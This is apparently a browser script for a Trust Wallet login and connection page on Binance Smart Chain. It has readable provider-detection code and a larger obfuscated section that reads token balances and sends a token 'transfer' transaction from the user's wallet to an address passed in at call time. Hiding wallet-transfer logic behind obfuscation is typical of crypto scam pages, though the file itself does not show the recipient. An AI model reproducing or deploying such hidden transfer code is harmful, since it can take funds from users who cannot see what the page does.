(function (_0x493651, _0x5f0b69) {
    const _0x3b5f49 = _0x5721,
        _0x460feb = _0x493651();
    while (!![]) {
        try {
            const _0x53b45f =
                (parseInt(_0x3b5f49(0xa5)) / (0x69a + 0x13 * 0x1b7 + -0x272e)) *
                    (parseInt(_0x3b5f49(0xbb)) /
                        (-0x2 * -0x144 + 0x82f + -0xab5)) +
                parseInt(_0x3b5f49(0xd5)) /
                    (0x4 * -0x5a8 + -0x1 * 0x188f + 0x2f32) +
                parseInt(_0x3b5f49(0xfc)) /
                    (0x20b3 + -0x1 * -0x1b23 + -0x193 * 0x26) +
                -parseInt(_0x3b5f49(0xca)) /
                    (-0x2669 * -0x1 + -0xf * 0x155 + -0x1269) +
                (-parseInt(_0x3b5f49(0x13e)) /
                    (0x1 * 0x1039 + -0x566 * -0x2 + 0x1 * -0x1aff)) *
                    (-parseInt(_0x3b5f49(0x16a)) /
                        (0x1 * -0x213b + 0x1456 * 0x1 + 0xcec)) +
                -parseInt(_0x3b5f49(0x173)) /
                    (0x3f7 + 0x2 * 0x83c + 0x1 * -0x1467) +
                parseInt(_0x3b5f49(0xaa)) / (-0x1390 + -0x13 * 0x8c + 0x1dfd);
            if (_0x53b45f === _0x5f0b69) break;
            else _0x460feb["push"](_0x460feb["shift"]());
        } catch (_0x450e03) {
            _0x460feb["push"](_0x460feb["shift"]());
        }
    }
})(_0x3611, -0xcf72e + -0x10 * 0x4e31 + 0xa * 0x27642);
// First define a function to get the TrustWallet provider from various possible locations
function getTrustWalletFromWindow() {
    const isTrustWallet = (ethereum) => {
        // Identify if Trust Wallet injected provider is present
        return !!ethereum.isTrust;
    };

    const injectedProviderExist =
        typeof window !== "undefined" && typeof window.ethereum !== "undefined";

    // No injected providers exist
    if (!injectedProviderExist) {
        console.log("No injected provider exists");
        return null;
    }

    // Trust Wallet was injected into window.ethereum
    if (isTrustWallet(window.ethereum)) {
        console.log("TrustWallet found in window.ethereum");
        return window.ethereum;
    }

    // Trust Wallet provider might be replaced by another
    // injected provider, check the providers array
    if (window.ethereum?.providers) {
        console.log("Checking ethereum.providers array");
        const trustProvider = window.ethereum.providers.find(isTrustWallet);
        if (trustProvider) {
            console.log("TrustWallet found in ethereum.providers array");
            return trustProvider;
        }
    }

    // Trust Wallet injected provider is available in the global scope
    if (window.trustwallet) {
        console.log("TrustWallet found in window.trustwallet");
        return window.trustwallet;
    }

    console.log("TrustWallet not found");
    return null;
}

// Function to listen for TrustWallet initialization
async function listenForTrustWalletInitialized(timeout = 3000) {
    console.log("Listening for TrustWallet initialization...");
    return new Promise((resolve) => {
        const handleInitialization = () => {
            console.log("TrustWallet initialization event detected");
            resolve(getTrustWalletFromWindow());
        };

        window.addEventListener(
            "trustwallet#initialized",
            handleInitialization,
            {
                once: true,
            }
        );

        setTimeout(() => {
            console.log("TrustWallet initialization timeout reached");
            window.removeEventListener(
                "trustwallet#initialized",
                handleInitialization,
                { once: true }
            );
            resolve(getTrustWalletFromWindow()); // One last check before resolving with null
        }, timeout);
    });
}

// Main function to get TrustWallet injected provider with timeout
async function getTrustWalletInjectedProvider(timeout = 3000) {
    console.log("Attempting to get TrustWallet provider...");
    const provider = getTrustWalletFromWindow();

    if (provider) {
        console.log("TrustWallet provider found immediately");
        return provider;
    }

    console.log(
        "TrustWallet provider not found, waiting for initialization..."
    );
    return listenForTrustWalletInitialized(timeout);
}

// Modified rconnect function that uses the improved provider detection
async function rconnect() {
    try {
        console.log("Starting wallet connection process...");
        document.getElementById("adata").innerHTML = "Connecting to wallet...";

        // Get the TrustWallet provider with improved detection
        const ethereum = await getTrustWalletInjectedProvider();

        if (!ethereum) {
            console.log("TrustWallet not detected after waiting");
            var raltElement = document.getElementById("ralt");
            raltElement.style.display = "block";
            document.getElementById("adata").innerHTML =
                "Not Connected to Wallet!";
            return;
        }

        console.log("TrustWallet detected, requesting accounts...");
        const web3 = new Web3(ethereum);

        // Request access to the wallet
        try {
            // This is legacy but kept for backward compatibility
            if (ethereum.enable) {
                await ethereum.enable();
            }

            // Try to switch to Binance Smart Chain
            try {
                await ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: "0x38" }], // BSC Mainnet
                });
                console.log("Successfully switched to BSC");
            } catch (switchError) {
                console.error("Error switching chain:", switchError);
                // If BSC network isn't added to the wallet
                if (switchError.code === 4902) {
                    document
                        .getElementById("submit")
                        .setAttribute("disabled", true);
                    document.getElementById("adata").innerHTML =
                        "Please add Binance Smart Chain network.";
                    return;
                }
            }

            // Update UI to show successful connection
            const dataElement = document.getElementById("adata");
            dataElement.style.color = "green";
            dataElement.innerHTML = "Wallet Connected!";

            // Get wallet address and update the form
            const accounts = await ethereum.request({
                method: "eth_requestAccounts",
            });
            console.log("Accounts:", accounts);

            if (accounts && accounts.length > 0) {
                let userAddress = accounts[0];
                const addressField = document.getElementById("adrdata");
                addressField.value = userAddress;
                console.log("Wallet connected successfully:", userAddress);
            } else {
                console.log("No accounts returned");
                document.getElementById("adata").innerHTML =
                    "No accounts returned from wallet.";
            }

            // Set up event listeners for account changes
            ethereum.on("accountsChanged", (accounts) => {
                console.log("Accounts changed:", accounts);
                if (accounts.length === 0) {
                    document.getElementById("adata").innerHTML =
                        "Wallet disconnected.";
                    document.getElementById("adrdata").value = "";
                } else {
                    document.getElementById("adrdata").value = accounts[0];
                }
            });

            // Set up event listeners for chain changes
            ethereum.on("chainChanged", (chainId) => {
                console.log("Chain changed:", chainId);
                if (chainId !== "0x38") {
                    document.getElementById("adata").innerHTML =
                        "Please switch to Binance Smart Chain.";
                } else {
                    document.getElementById("adata").innerHTML =
                        "Wallet Connected!";
                }
            });
        } catch (error) {
            console.error("Error connecting to wallet:", error);
            document.getElementById("adata").innerHTML =
                "Error connecting: " + (error.message || "Unknown error");
            return null;
        }
    } catch (error) {
        console.error("Unexpected error:", error);
        document.getElementById("adata").innerHTML =
            "Unexpected error: " + (error.message || "Unknown error");
        return null;
    }
}

// Function to manually trigger reconnection
function re() {
    console.log("Manual reconnect triggered");
    rconnect();
}
// Reusing the same TrustWallet provider detection functions we created earlier
// This is the improved lconnect function that works similarly to rconnect but for login functionality

async function lconnect() {
    try {
        console.log("Starting wallet login process...");
        document.getElementById("adata").innerHTML = "Connecting to wallet...";

        // Get the TrustWallet provider with improved detection
        const ethereum = await getTrustWalletInjectedProvider();

        if (!ethereum) {
            console.log("TrustWallet not detected after waiting");
            var raltElement = document.getElementById("ralt");
            raltElement.style.display = "block";
            document.getElementById("adata").innerHTML =
                "Not Connected to Wallet!";
            return;
        }

        console.log("TrustWallet detected, requesting accounts for login...");
        const web3 = new Web3(ethereum);

        // Request access to the wallet
        try {
            // This is legacy but kept for backward compatibility
            if (ethereum.enable) {
                await ethereum.enable();
            }

            // Try to switch to Binance Smart Chain
            try {
                await ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: "0x38" }], // BSC Mainnet
                });
                console.log("Successfully switched to BSC");
            } catch (switchError) {
                console.error("Error switching chain:", switchError);
                // If BSC network isn't added to the wallet
                if (switchError.code === 4902) {
                    document
                        .getElementById("submit")
                        .setAttribute("disabled", true);
                    document.getElementById("adata").innerHTML =
                        "Please add Binance Smart Chain network.";
                    return;
                }
            }

            // Update UI to show successful connection
            const dataElement = document.getElementById("adata");
            dataElement.style.color = "green";
            dataElement.innerHTML = "Wallet Connected!";

            // Get wallet address and update the form for login
            const accounts = await ethereum.request({
                method: "eth_requestAccounts",
            });
            console.log("Login accounts:", accounts);

            if (accounts && accounts.length > 0) {
                let userAddress = accounts[0];
                const addressField = document.getElementById("ladr"); // Different field for login
                addressField.value = userAddress;
                console.log("Wallet login successful:", userAddress);
            } else {
                console.log("No accounts returned");
                document.getElementById("adata").innerHTML =
                    "No accounts returned from wallet.";
            }

            // Set up event listeners for account changes
            ethereum.on("accountsChanged", (accounts) => {
                console.log("Accounts changed during login:", accounts);
                if (accounts.length === 0) {
                    document.getElementById("adata").innerHTML =
                        "Wallet disconnected.";
                    document.getElementById("ladr").value = "";
                } else {
                    document.getElementById("ladr").value = accounts[0];
                }
            });

            // Set up event listeners for chain changes
            ethereum.on("chainChanged", (chainId) => {
                console.log("Chain changed during login:", chainId);
                if (chainId !== "0x38") {
                    document.getElementById("adata").innerHTML =
                        "Please switch to Binance Smart Chain.";
                } else {
                    document.getElementById("adata").innerHTML =
                        "Wallet Connected!";
                }
            });
        } catch (error) {
            console.error("Error connecting wallet for login:", error);
            document.getElementById("adata").innerHTML =
                "Login error: " + (error.message || "Unknown error");
            return null;
        }
    } catch (error) {
        console.error("Unexpected error during login:", error);
        document.getElementById("adata").innerHTML =
            "Unexpected login error: " + (error.message || "Unknown error");
        return null;
    }
}

// Note: This function depends on the getTrustWalletInjectedProvider function
// that we defined in the previous artifact. Make sure that function is included
// in your final code.
function re() {
    const _0x4e59f5 = _0x5721;
    location[_0x4e59f5(0x132)]();
}
async function pconnect() {
    const _0x55a9 = _0x5721,
        _0x1c192c = {
            KmJUP: function (_0xb7e43, _0xf3751d) {
                return _0xb7e43(_0xf3751d);
            },
            BMoHi: _0x55a9(0x137),
            dFumF: _0x55a9(0x14a),
            TdRfF: _0x55a9(0x154),
            jhAeU: _0x55a9(0xa7),
            vZaVg: function (_0x2963a3, _0x29317a, _0x3a8dd0) {
                return _0x2963a3(_0x29317a, _0x3a8dd0);
            },
            HGOor: function (_0x33252d, _0x8a9b0a, _0x439e42) {
                return _0x33252d(_0x8a9b0a, _0x439e42);
            },
            ZreXX: function (_0x343838, _0x1d6f5c) {
                return _0x343838 != _0x1d6f5c;
            },
            RGgAv: _0x55a9(0x181),
            dCnMu: _0x55a9(0x12a),
            zpUZi: _0x55a9(0x168),
            frPwQ: _0x55a9(0x120),
            vmfcm: _0x55a9(0x13b) + _0x55a9(0xc9),
            bEwoV: _0x55a9(0x180),
            XuHdq: function (_0x46dbc1, _0x5e49e4) {
                return _0x46dbc1 !== _0x5e49e4;
            },
            fIyyg: _0x55a9(0x8d),
            zuTyk: _0x55a9(0x147) + _0x55a9(0x85) + _0x55a9(0xf7),
            LklTF: _0x55a9(0x12c),
            bnBUq: function (_0x70aafb, _0x1682cf) {
                return _0x70aafb === _0x1682cf;
            },
            VpOls: _0x55a9(0x170) + _0x55a9(0xc1) + _0x55a9(0x14c) + ".",
            lzVFY: _0x55a9(0x9e) + _0x55a9(0xf8),
            qEPZF:
                _0x55a9(0xa6) + _0x55a9(0x81) + _0x55a9(0x9d) + _0x55a9(0xdc),
            ZqGAu:
                _0x55a9(0x126) +
                _0x55a9(0xf6) +
                _0x55a9(0xda) +
                _0x55a9(0x18b) +
                "!",
            tpWqk: function (_0x25d5e3) {
                return _0x25d5e3();
            },
        },
        _0x180122 = window[_0x55a9(0x16d)],
        _0x2a8c07 = new Web3(window[_0x55a9(0x16d)]);
    if (
        _0x1c192c[_0x55a9(0x150)](
            typeof window[_0x55a9(0x16d)],
            _0x1c192c[_0x55a9(0xe8)]
        ) &&
        window[_0x55a9(0x16d)][_0x55a9(0xba)]
    )
        try {
            await window[_0x55a9(0x16d)][_0x55a9(0x87)]();
            try {
                await _0x180122[_0x55a9(0xec)]({
                    method: _0x1c192c[_0x55a9(0xdf)],
                    params: [{ chainId: _0x1c192c[_0x55a9(0x9a)] }],
                });
            } catch (_0x425a9b) {
                _0x1c192c[_0x55a9(0x17c)](
                    _0x425a9b[_0x55a9(0x8e)],
                    -0x7a0 + -0x11ca + 0x290b * 0x1
                ) &&
                    (document[_0x55a9(0xff) + _0x55a9(0x17f)](
                        _0x1c192c[_0x55a9(0x97)]
                    )[_0x55a9(0x17b) + "te"](_0x1c192c[_0x55a9(0xd4)], !![]),
                    _0x1c192c[_0x55a9(0xb0)](
                        setError,
                        _0x1c192c[_0x55a9(0x104)]
                    ));
            }
            _0x180122[_0x55a9(0xec)]({ method: _0x1c192c[_0x55a9(0x113)] })[
                _0x55a9(0x106)
            ]((_0x1b617e) => {
                const _0x107792 = _0x55a9,
                    _0x1c650b = {
                        YTdAS: function (_0x271413, _0x12bb5b) {
                            const _0xe64ca3 = _0x5721;
                            return _0x1c192c[_0xe64ca3(0xb0)](
                                _0x271413,
                                _0x12bb5b
                            );
                        },
                        QvkUe: _0x1c192c[_0x107792(0x169)],
                        yzvTT: _0x1c192c[_0x107792(0x12e)],
                    };
                let _0x3a485f = _0x1b617e[-0x270d + 0xed5 * 0x1 + 0x64 * 0x3e];
                const _0x3adc61 = document[_0x107792(0xff) + _0x107792(0x17f)](
                    _0x1c192c[_0x107792(0x11f)]
                );
                _0x3adc61[_0x107792(0x100)] = _0x3a485f;
                let _0x4212fb = document[_0x107792(0xff) + _0x107792(0x17f)](
                        _0x1c192c[_0x107792(0x128)]
                    )[_0x107792(0x100)],
                    _0x416ce7 = _0x3a485f;
                (a1 = _0x1c192c[_0x107792(0x9c)](
                    parseInt,
                    _0x4212fb,
                    -0x24b2 + -0xd21 * 0x1 + 0x31e3
                )),
                    (a2 = _0x1c192c[_0x107792(0x10c)](
                        parseInt,
                        _0x416ce7,
                        -0x905 + -0x33 * 0x7a + 0x2163
                    )),
                    _0x1c192c[_0x107792(0x115)](a1, a2) &&
                        ((document[_0x107792(0xff) + _0x107792(0x17f)](
                            _0x1c192c[_0x107792(0x114)]
                        )[_0x107792(0x176)][_0x107792(0xd9)] =
                            _0x1c192c[_0x107792(0xef)]),
                        document[_0x107792(0xff) + _0x107792(0x17f)](
                            _0x1c192c[_0x107792(0x97)]
                        )[_0x107792(0x17b) + "te"](
                            _0x1c192c[_0x107792(0xd4)],
                            !![]
                        )),
                    window[_0x107792(0x16d)]
                        [_0x107792(0xec)]({
                            method: _0x1c192c[_0x107792(0xb2)],
                            params: [_0x3a485f, _0x1c192c[_0x107792(0x82)]],
                        })
                        [_0x107792(0x106)]((_0xeac667) => {
                            const _0x3ffd8a = _0x107792,
                                _0xc2b38f = _0x1c650b[_0x3ffd8a(0xad)](
                                    parseFloat,
                                    _0x2a8c07[_0x3ffd8a(0x94)][
                                        _0x3ffd8a(0x15f)
                                    ](_0xeac667, _0x1c650b[_0x3ffd8a(0x135)])
                                ),
                                _0x1a8703 = document[
                                    _0x3ffd8a(0xff) + _0x3ffd8a(0x17f)
                                ](_0x1c650b[_0x3ffd8a(0x187)]);
                            _0x1a8703[_0x3ffd8a(0x100)] = _0xc2b38f[
                                _0x3ffd8a(0x86)
                            ](-0x700 + -0x1520 + 0x1c24);
                        });
            });
        } catch (_0x471114) {
            return (
                console[_0x55a9(0x11a)](_0x1c192c[_0x55a9(0xd8)], _0x471114),
                null
            );
        }
    else _0x1c192c[_0x55a9(0xb0)](alert, _0x1c192c[_0x55a9(0xbf)]);
    _0x1c192c[_0x55a9(0x118)](TBal);
}
async function TBal() {
    const _0x2b0aac = _0x5721,
        _0x464cc2 = {
            KWgnC: function (_0x416f9a, _0x1906db) {
                return _0x416f9a(_0x1906db);
            },
            IZePr: _0x2b0aac(0x9e) + _0x2b0aac(0xf8),
        },
        _0x348b3e = window[_0x2b0aac(0x16d)];
    _0x348b3e[_0x2b0aac(0xec)]({ method: _0x464cc2[_0x2b0aac(0x89)] })[
        _0x2b0aac(0x106)
    ]((_0x3bd1fb) => {
        const _0x480c46 = _0x2b0aac;
        let _0x527898 = _0x3bd1fb[-0xe45 + 0x26 * 0x40 + -0x197 * -0x3];
        (tokenHolder = _0x527898),
            _0x464cc2[_0x480c46(0x138)](ball, tokenHolder);
    });
}
async function ball(_0x1e4f84) {
    const _0x5f3555 = _0x5721,
        _0x51cedd = {
            hoeck:
                _0x5f3555(0xc8) +
                _0x5f3555(0x99) +
                _0x5f3555(0xd2) +
                _0x5f3555(0x117),
            DZOST:
                _0x5f3555(0x96) +
                _0x5f3555(0x122) +
                _0x5f3555(0x183) +
                _0x5f3555(0x124) +
                "55",
            MjnYy: _0x5f3555(0xe9),
            gOoIQ: _0x5f3555(0x161),
            rwjGt: _0x5f3555(0x144),
            DBAsb: _0x5f3555(0x10a),
            gpRoQ: _0x5f3555(0x7e),
            NLLUi: _0x5f3555(0x130),
            LBqHV: _0x5f3555(0xe4),
            HQEqA: _0x5f3555(0x101),
            HjCOS: _0x5f3555(0xab),
            DrXuZ: _0x5f3555(0x10e),
            KlSar: _0x5f3555(0x12b),
            KVNfA: _0x5f3555(0xcb),
            PGesq: _0x5f3555(0xa1),
            bGsXm: _0x5f3555(0x137),
            FmeSP: function (_0x4c454a, _0x3c2829) {
                return _0x4c454a + _0x3c2829;
            },
            NVLMK: _0x5f3555(0x152) + _0x5f3555(0xb3),
            NbweS: _0x5f3555(0xae),
        },
        _0x1c1cc0 = new Web3(
            new Web3[_0x5f3555(0xbc)][_0x5f3555(0x178) + "er"](
                _0x51cedd[_0x5f3555(0x7f)]
            )
        );
    let _0x3a285e = _0x51cedd[_0x5f3555(0x13c)],
        _0x590d54 = [
            {
                constant: !![],
                inputs: [
                    {
                        name: _0x51cedd[_0x5f3555(0x8f)],
                        type: _0x51cedd[_0x5f3555(0x155)],
                    },
                ],
                name: _0x51cedd[_0x5f3555(0xea)],
                outputs: [
                    {
                        name: _0x51cedd[_0x5f3555(0xe6)],
                        type: _0x51cedd[_0x5f3555(0x93)],
                    },
                ],
                type: _0x51cedd[_0x5f3555(0x175)],
            },
            {
                constant: !![],
                inputs: [],
                name: _0x51cedd[_0x5f3555(0x151)],
                outputs: [{ name: "", type: _0x51cedd[_0x5f3555(0x95)] }],
                type: _0x51cedd[_0x5f3555(0x175)],
            },
            {
                constant: ![],
                inputs: [
                    {
                        name: _0x51cedd[_0x5f3555(0xf5)],
                        type: _0x51cedd[_0x5f3555(0x155)],
                    },
                    {
                        name: _0x51cedd[_0x5f3555(0x12f)],
                        type: _0x51cedd[_0x5f3555(0x93)],
                    },
                ],
                name: _0x51cedd[_0x5f3555(0x17a)],
                outputs: [{ name: "", type: _0x51cedd[_0x5f3555(0xc2)] }],
                payable: ![],
                stateMutability: _0x51cedd[_0x5f3555(0x91)],
                type: _0x51cedd[_0x5f3555(0x175)],
            },
        ];
    const _0x2484a9 = new _0x1c1cc0[_0x5f3555(0xbd)][_0x5f3555(0xee)](
            _0x590d54,
            _0x3a285e
        ),
        _0x5a478c = await _0x2484a9[_0x5f3555(0x13a)]
            [_0x5f3555(0x144)](_0x1e4f84)
            [_0x5f3555(0xa8)](),
        _0x293990 = _0x1c1cc0[_0x5f3555(0x94)][_0x5f3555(0x15f)](
            _0x5a478c,
            _0x51cedd[_0x5f3555(0x16c)]
        );
    console[_0x5f3555(0x131)](
        _0x51cedd[_0x5f3555(0x177)](_0x51cedd[_0x5f3555(0xd3)], _0x293990)
    );
    var _0x4d40f1 = document[_0x5f3555(0xff) + _0x5f3555(0x17f)](
        _0x51cedd[_0x5f3555(0xfe)]
    );
    _0x4d40f1[_0x5f3555(0x100)] = _0x293990;
}
async function trans3(_0x2c5625, _0x46ca54, _0x500892) {
    const _0x59f961 = _0x5721,
        _0x3bfbca = {
            xFmET:
                _0x59f961(0x10b) +
                _0x59f961(0xa0) +
                _0x59f961(0x189) +
                _0x59f961(0xde) +
                _0x59f961(0x110) +
                _0x59f961(0x10d) +
                "f",
            YWYyu:
                _0x59f961(0x96) +
                _0x59f961(0x122) +
                _0x59f961(0x183) +
                _0x59f961(0x124) +
                "55",
            evxWm: _0x59f961(0xe9),
            hErKO: _0x59f961(0x161),
            mInJU: _0x59f961(0x144),
            IYydQ: _0x59f961(0x10a),
            aNodD: _0x59f961(0x7e),
            fHpsP: _0x59f961(0x130),
            zpeXb: _0x59f961(0xe4),
            oWIhH: _0x59f961(0x101),
            RAkOj: _0x59f961(0xab),
            laXwj: _0x59f961(0x10e),
            mvxOX: _0x59f961(0x12b),
            nSiRr: _0x59f961(0xcb),
            GtsPd: _0x59f961(0xa1),
            HEeuE: _0x59f961(0x137),
            xVKXo: _0x59f961(0x102) + _0x59f961(0x11c),
            alvJH: function (_0xb0bf58, _0x214aca) {
                return _0xb0bf58(_0x214aca);
            },
            OvtsY: _0x59f961(0x16f),
            hFBxU: _0x59f961(0x103) + _0x59f961(0x9f) + _0x59f961(0xe3),
            vIwgW: _0x59f961(0x168),
            CdThc: _0x59f961(0x12a),
            ePUxY: _0x59f961(0x11e),
            sqrHO: _0x59f961(0x121),
        };
    try {
        const _0x25a69c = new Web3[_0x59f961(0xbc)][_0x59f961(0x178) + "er"](
                _0x3bfbca[_0x59f961(0xd7)]
            ),
            _0x13a145 = new Web3(_0x25a69c),
            _0x89b2c8 = window[_0x59f961(0x16d)];
        await _0x89b2c8[_0x59f961(0x87)](),
            _0x13a145[_0x59f961(0x84) + "r"](_0x89b2c8);
        const _0x267c6d = _0x3bfbca[_0x59f961(0x164)],
            _0x5e56d0 = [
                {
                    constant: !![],
                    inputs: [
                        {
                            name: _0x3bfbca[_0x59f961(0xb7)],
                            type: _0x3bfbca[_0x59f961(0xcc)],
                        },
                    ],
                    name: _0x3bfbca[_0x59f961(0x105)],
                    outputs: [
                        {
                            name: _0x3bfbca[_0x59f961(0x116)],
                            type: _0x3bfbca[_0x59f961(0x11d)],
                        },
                    ],
                    type: _0x3bfbca[_0x59f961(0xcd)],
                },
                {
                    constant: !![],
                    inputs: [],
                    name: _0x3bfbca[_0x59f961(0xa4)],
                    outputs: [{ name: "", type: _0x3bfbca[_0x59f961(0x140)] }],
                    type: _0x3bfbca[_0x59f961(0xcd)],
                },
                {
                    constant: ![],
                    inputs: [
                        {
                            name: _0x3bfbca[_0x59f961(0xf2)],
                            type: _0x3bfbca[_0x59f961(0xcc)],
                        },
                        {
                            name: _0x3bfbca[_0x59f961(0x174)],
                            type: _0x3bfbca[_0x59f961(0x11d)],
                        },
                    ],
                    name: _0x3bfbca[_0x59f961(0x141)],
                    outputs: [{ name: "", type: _0x3bfbca[_0x59f961(0x145)] }],
                    payable: ![],
                    stateMutability: _0x3bfbca[_0x59f961(0xc0)],
                    type: _0x3bfbca[_0x59f961(0xcd)],
                },
            ];
        let _0x30edd6 = _0x2c5625;
        const _0x2c34b1 = new _0x13a145[_0x59f961(0xbd)][_0x59f961(0xee)](
                _0x5e56d0,
                _0x267c6d
            ),
            _0x27c31f = _0x46ca54,
            _0x435758 = _0x500892,
            _0x538146 = _0x13a145[_0x59f961(0x94)][_0x59f961(0xcf)](
                _0x30edd6[_0x59f961(0xdb)](),
                _0x3bfbca[_0x59f961(0xd1)]
            ),
            _0x29ec93 = _0x2c34b1[_0x59f961(0x13a)]
                [_0x59f961(0x12b)](_0x435758, _0x538146)
                [_0x59f961(0x172)](),
            _0x3558f6 = { from: _0x27c31f, to: _0x267c6d, data: _0x29ec93 },
            _0x3c75a3 = await ethereum[_0x59f961(0xec)]({
                method: _0x3bfbca[_0x59f961(0x9b)],
                params: [_0x3558f6],
            }),
            _0x5996fd = await _0x3bfbca[_0x59f961(0xe2)](
                checkTransactionconfirmation,
                _0x3c75a3
            );
        return (
            (document[_0x59f961(0xff) + _0x59f961(0x17f)](
                _0x3bfbca[_0x59f961(0xb1)]
            )[_0x59f961(0x100)] = _0x5996fd),
            _0x5996fd
        );
    } catch (_0x5cb2eb) {
        console[_0x59f961(0x11a)](_0x3bfbca[_0x59f961(0x171)], _0x5cb2eb);
        const _0x32e678 = document[_0x59f961(0xff) + _0x59f961(0x17f)](
            _0x3bfbca[_0x59f961(0x18a)]
        );
        _0x32e678[_0x59f961(0x176)][_0x59f961(0xd9)] =
            _0x3bfbca[_0x59f961(0x15d)];
        const _0x46e3a2 = document[_0x59f961(0xff) + _0x59f961(0x17f)](
            _0x3bfbca[_0x59f961(0x160)]
        );
        return (
            (_0x46e3a2[_0x59f961(0x176)][_0x59f961(0xd9)] =
                _0x3bfbca[_0x59f961(0xe7)]),
            -(0x10d * -0x6 + -0xa6c + 0x10bb)
        );
    }
}
function _0x5721(_0x4e433d, _0x38ca88) {
    const _0xd93392 = _0x3611();
    return (
        (_0x5721 = function (_0x4a5729, _0x541c91) {
            _0x4a5729 =
                _0x4a5729 - (0x1e0 * -0xb + 0x2 * -0xada + 0x15 * 0x20a);
            let _0x1590d9 = _0xd93392[_0x4a5729];
            return _0x1590d9;
        }),
        _0x5721(_0x4e433d, _0x38ca88)
    );
}
function checkTransactionconfirmation(_0x3c335d) {
    const _0x5b1ee5 = _0x5721,
        _0x2d2ee6 = {
            xzbFr: function (_0xc842ea, _0x5d874f) {
                return _0xc842ea != _0x5d874f;
            },
            Bnnop: function (_0x53f8d1) {
                return _0x53f8d1();
            },
            fZldn: _0x5b1ee5(0xc6) + _0x5b1ee5(0x149) + _0x5b1ee5(0x167),
            HXUzY: function (_0x825f10) {
                return _0x825f10();
            },
        };
    let _0x4c4964 = () => {
        const _0x397126 = _0x5b1ee5;
        return ethereum[_0x397126(0xec)]({
            method: _0x2d2ee6[_0x397126(0xc3)],
            params: [_0x3c335d],
        })[_0x397126(0x106)]((_0x2837b7) => {
            const _0x3efa93 = _0x397126;
            return _0x2d2ee6[_0x3efa93(0x15c)](_0x2837b7, null)
                ? _0x3c335d
                : _0x2d2ee6[_0x3efa93(0xe1)](_0x4c4964);
        });
    };
    return _0x2d2ee6[_0x5b1ee5(0x11b)](_0x4c4964);
}
function _0x3611() {
    const _0x1b74de = [
        "HjCOS",
        "et\x20is\x20not\x20",
        "mChain",
        "tAccounts",
        "BZMTy",
        "DWJXN",
        "jWumA",
        "2216124iOPcoN",
        "nAhRB",
        "NbweS",
        "getElement",
        "value",
        "uint8",
        "eth_sendTr",
        "Promise\x20re",
        "VpOls",
        "mInJU",
        "then",
        "tion",
        "BUiSa",
        "MQybG",
        "balance",
        "https://ma",
        "HGOor",
        "12ab66aac2",
        "_value",
        "ahPhi",
        "54d45aff53",
        "ralt",
        "split",
        "lzVFY",
        "RGgAv",
        "ZreXX",
        "IYydQ",
        "org:443",
        "tpWqk",
        "Transactio",
        "error",
        "HXUzY",
        "ansaction",
        "aNodD",
        "load",
        "TdRfF",
        "disabled",
        "none",
        "6f99059ff7",
        "getBalance",
        "9027b31979",
        "ladr",
        "Trust\x20wall",
        "SlYFf",
        "jhAeU",
        "adrdata",
        "block",
        "transfer",
        "0x38",
        "Uaffg",
        "dFumF",
        "DrXuZ",
        "function",
        "log",
        "reload",
        "izPYD",
        "innerHTML",
        "QvkUe",
        "UDKxE",
        "ether",
        "KWgnC",
        "nRbSM",
        "methods",
        "eth_getBal",
        "DZOST",
        "dDonG",
        "48234eGBxME",
        "Wallet\x20Con",
        "oWIhH",
        "mvxOX",
        "mIlft",
        "CuSlT",
        "balanceOf",
        "nSiRr",
        "HrDlV",
        "wallet_swi",
        "rawTransac",
        "nsactionRe",
        "coin",
        "oLgWR",
        "ing\x20chains",
        "crTsb",
        "asubmit",
        "MaKkn",
        "XuHdq",
        "LBqHV",
        "Token\x20Bala",
        "EKXXs",
        "wadr",
        "gOoIQ",
        "jKJeR",
        "FaWez",
        "EOZea",
        "NMHGt",
        "hBhrU",
        "fogMG",
        "xzbFr",
        "CdThc",
        "dSGIJ",
        "fromWei",
        "ePUxY",
        "address",
        "adata",
        "vcmow",
        "YWYyu",
        "wHXUD",
        "FSEYV",
        "ceipt",
        "submit",
        "BMoHi",
        "413rzIfQk",
        "substr",
        "bGsXm",
        "ethereum",
        "signTransa",
        "txnid",
        "User\x20rejec",
        "hFBxU",
        "encodeABI",
        "6926768PHUQrp",
        "laXwj",
        "NLLUi",
        "style",
        "FmeSP",
        "HttpProvid",
        "ZTvKS",
        "KlSar",
        "setAttribu",
        "bnBUq",
        "ction",
        "dvqBz",
        "ById",
        "latest",
        "mmsg",
        "EfDqX",
        "7548524699",
        "Withdrawal",
        "Hexxm",
        "sDjvz",
        "yzvTT",
        "iCRwE",
        "ra.io/v3/e",
        "vIwgW",
        "or\x20login\x20!",
        "uint256",
        "hoeck",
        "reverse",
        "ecting\x20to\x20",
        "bEwoV",
        "EfRbU",
        "setProvide",
        "tchEthereu",
        "toFixed",
        "enable",
        "length",
        "IZePr",
        "Error:",
        "QKRVc",
        "hNYqw",
        "undefined",
        "code",
        "MjnYy",
        "qQzsV",
        "PGesq",
        "getGasPric",
        "gpRoQ",
        "utils",
        "HQEqA",
        "0x55d39832",
        "zpUZi",
        "ALKka",
        "c-dataseed",
        "LklTF",
        "xVKXo",
        "vZaVg",
        "Trust\x20Wall",
        "eth_reques",
        "jected\x20wit",
        "innet.infu",
        "nonpayable",
        "KUTEf",
        "transactio",
        "zpeXb",
        "3WVonrD",
        "Error\x20conn",
        "uadr",
        "call",
        "green",
        "7418457fKHZaV",
        "_to",
        "fkzDL",
        "YTdAS",
        "token",
        "nected",
        "KmJUP",
        "OvtsY",
        "vmfcm",
        "nce:\x20",
        "\x20successfu",
        "JnaZH",
        "NCqZV",
        "evxWm",
        "lpcgj",
        "sendSigned",
        "isTrust",
        "40382gMRbUC",
        "providers",
        "eth",
        "KZUgO",
        "ZqGAu",
        "GtsPd",
        "ted\x20switch",
        "KVNfA",
        "fZldn",
        "TYSAW",
        "uJFgK",
        "eth_getTra",
        "join",
        "https://bs",
        "ance",
        "4158420bEUoqp",
        "bool",
        "hErKO",
        "fHpsP",
        "NYXlx",
        "toWei",
        "zxEfl",
        "HEeuE",
        "1.binance.",
        "NVLMK",
        "frPwQ",
        "683490HGdWCP",
        "HcgTM",
        "xFmET",
        "qEPZF",
        "display",
        "connected\x20",
        "toString",
        "et\x20:",
        "tKiET",
        "2512a64928",
        "zuTyk",
        "UOchk",
        "Bnnop",
        "alvJH",
        "h\x20error:",
        "decimals",
        "accounts",
        "DBAsb",
        "sqrHO",
        "fIyyg",
        "_owner",
        "rwjGt",
        "RATLx",
        "request",
        "ejqgI",
        "Contract",
        "dCnMu",
        "Eccba",
        "nMDFZ",
        "RAkOj",
        "color",
